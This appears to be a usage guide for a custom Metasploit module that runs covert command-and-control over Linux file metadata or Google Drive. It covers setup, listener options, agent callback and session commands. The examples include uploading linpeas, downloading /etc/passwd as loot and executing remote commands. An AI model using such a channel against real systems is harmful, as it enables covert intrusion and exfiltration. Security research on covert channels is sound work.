# Metasploit Usage

This document will provide all the information needed to utilize the metasploit module. The metasploit module is located at `metasploit/camaleonte`

## Setup
Currently there are not capabilities to seamlessly install our custom module to a metasploit installation. You have to set up a development environment to execute the module.

First, clone the metasploit-framework github repo. Use `--depth 1` to exclude the git history:

```bash
git clone --depth 1 https://github.com/rapid7/metasploit-framework.git
```

*NOTE:* As of August 1, 2025, this works. But in the future our custom module may become incompatible. 

Our module works as of commit `b39d45c20504551614f5547d39e42efbf4bd8fa0` on `https://github.com/rapid7/metasploit-framework.git`. 

Change your directory into the repo and then insert our custom module into the module library: 
```bash
cp -r <path-to-metasploit/camaleonte> modules/auxiliary/
```

Ensure you have `ruby v3.2.8` installed as well as `bundle`. If not, then follow these instructions for a linux installation:

Install [rbenv](https://github.com/rapid7/metasploit-framework#), install ruby v3.2.8 and configure the local environment to use it.
```bash
curl -fsSL https://github.com/rbenv/rbenv-installer/raw/HEAD/bin/rbenv-installer | bash
rbenv install 3.2.8
rbenv local 3.2.8
```

Add the following to the `Gemfile` (located in root directory of `metasploit-framework`):
```ruby
group :camaleonte do
  gem 'ffi-xattr'
  gem 'google'
  gem 'google-apis-drive_v3'
  gem 'googleauth'
end
```

Install bundler and all required gems. Note you may have dependency issues, in that case follow online instructions on how to install dependencies.
```bash
gem install bundler
bundler install
```

Now you can run the metasploit console with the command:
```bash
bundle exec ruby ./msfconsole
```


## Configure Listener

Once you have the metasploit set up and running you can start using the custom module. To use the module, enter this command on metasploit:

```
use auxiliary/camaleonte/handler
```

Now you can start configuring options for the covert channel you would like to run. Heres an overview:


| Name        | Required | Description                              | Possible Values                          |
|-------------|----------|------------------------------------------|------------------------------------------|
| `FILESYSTEM`| Yes      | Filesystem medium for channel            | `linux`, `google` |
| `PROTOCOL`  | Yes      | Protocol/ used                           | `metadata`, `hash` |
| `RESET`     | Yes      | Reset the client count                   | `true`, `false` |
| `PATH`      | No       | Path to folder of covert channel         | Path to mount (required for `drive` and `linux`) |
| `CRED_PATH` | No       | Path to credentials file                 | Path to oauth credentials (required for `google`) |


There are currently two filesystem mediums implemented:
- Linux based
- Google Drive based

Additionally, there are currently two encoding protocols implemented:
- Hash based (`hash`, `hashbased`)
- Metadata based (`metadata`, `meta`)

Currenlty, both encoding protocols are implemented by both filesystems (you can do `linux/hash`, `google/hash`, etc)

### Linux based
- This should selected for EXT4 based linux systems, where the `xattr` properties exist. This includes NFS shares and the local Linux filesystem.

- To select this `FILESYSTEM` you can use the following aliases: `linux`, `nfs`, `lfs`. They all point to the same utility class internally, aliases are just to provide clarity.

- Must set the `PATH` variable to the path of the shared folder.

- This filesystem is compatible with the hash-based and metadata-based protocols.

### Drive based
- This should be selected if communication over a shared google drive filesytem is desired.

- To select this `FILESYSTEM` you can use the following aliases: `google`, `drive`, `dfs`.

- Must set `CRED_PATH` to the path to OAuth credentials (this can be obtained from Google Cloud).

- Must set `PATH` to the id of the shared drive folder.

- Additional detail on how to obtain these paths can be found in Python usage [guide](<Python Usage.md>). Make sure the folder you set has files in it, else the program will crash.
 
- Upon initialization, you will be prompted by the console to authorize access to your Google account. Follow the instructions. This will create a `token.yaml` in the current working directory, that will save you having to re-authenticate every time you start a listener. 

- Right now the Google Drive medium is a proof of concept and should be developed further for seamless C2 integration. 


The `RESET` flag indicates wheter the new listener will reset the current client count to 0. By default, `RESET` is set to `true`. If you want to start a listener for a fileshare you already have another client connected to, set `RESET` to `false`. 

Currently there is a bug for multiple clients capabilities where the first command you send might be messed up. If you send the command again, it will resolve.

Once all the flags are set, you can start the listener with the `run` command.

## Client Callback
- To callback to your listener, you must execute a client with the same filesystem and protocol configuration. Currently, there are only 2 ways to do this:
    - Upload python code to remote system and execute it
    - Compile the python code into a binary file, then upload it and execute
    - Guides to both of these can be found [here](<Python Usage.md>)\.

## Interacting with Session
Once a client callbacks to your listener, you should see a notification about a new session being created. To interact with this agent enter the following command: `sessions -i <session-id>`.

Once you are in the session, you should see be inside a CLI that you can use to send C2 commands to the client. Currently these commands are implemented:

### Upload
Usage: 
```
upload <local-path> <remote-path>
```
Description:

Uploads local file to the agent. Example: `upload /payloads/linpeas.sh /tmp/linpeas.sh`.

### Download
#### Usage
```
download <remote-path> <local-path>
```
#### Description

Downloads remote file to the current working directory. Example: `download /etc/passwd loot`.


### Execute
**Usage:**
```
execute <remote-command>
```

**Description:**

Execute `remote-command` on the agent. Does not support shell operators such as `<`, `&`, etc. Also does not support interactive commands such as `sudo` and `top`. Currently, commands are run on the same thread as the client meaning if the command hangs, then you must terminate the session.

The commands `ls`, `cat`, `ps` and `pwd`can be executed without specifying `execute` in the beginning for convenience.

### Backgrounding + Exit
To background the session you can use the commands: `background` or `bg`.

To exit from the session you can use the commands: `exit` or `quit`. This will also remotely terminate the agent.

If the session hangs, then you can hit `Ctrl + C` a few times and then use the `exit` command to exit. If the session is still running, you can forcefully kill it using `sessions -k <session-id>`.


## Areas of Improvment
- Add more configurable options that the user can control:
    - Manually set a `client_cnt` and/or `channel_pos` so if a previous session exits, you can manually insert new one into place
- Ability to start a persistent listener so that clients can join in the background
- Clean up session management
    - Handle `Ctrl + C` and `Ctrl + Z` properly
    - Also killing sessions for agents that are already dead/not communicating takes 5 seconds due to our implementation. Can definitely be cleaned up.
- Add timeouts for remote command execution
    - This would require modifying client to execute commands in a seperate thread as well
- Fix sometimes buggy first command sent in multiple clients 
